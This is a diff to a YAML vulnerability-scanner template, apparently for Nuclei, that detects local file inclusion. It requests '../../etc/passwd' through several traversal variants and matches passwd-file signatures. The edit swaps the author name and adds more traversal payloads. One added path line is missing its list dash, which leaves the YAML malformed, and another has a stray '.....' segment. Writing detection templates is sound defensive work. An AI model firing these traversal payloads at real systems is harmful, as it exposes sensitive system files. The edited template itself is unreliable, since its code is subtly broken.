@@ -2,7 +2,7 @@ id: lfi-sensitive-files
 
 info:
   name: LFI Sensitive Files Disclosure
-  author: DAAKU
+  author: UMESH
   severity: high
   description: Detects LFI by reading sensitive system files with signature verification
 
@@ -10,8 +10,10 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../../...../../../../../../etc/passwd"
       - "{{BaseURL}}/load?file=../../../../etc/passwd"
-      - "{{BaseURL}}/download?path=....//....//....//etc/passwd"
+      "{{BaseURL}}/load?file=../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/download?path=....//....//....//....//....//....//....//....//etc/passwd"
       - "{{BaseURL}}/static/..%252f..%252f..%252fetc/passwd"
       
     headers:
@@ -22,7 +24,7 @@ http:
       - type: regex
         part: body
         regex:
-          - "root:.*:0:0:"  # Linux passwd file signature
+          - "root:.*:0:0:" 
           - "daemon:.*:1:1:"
           - "bin:.*:2:2:"
           
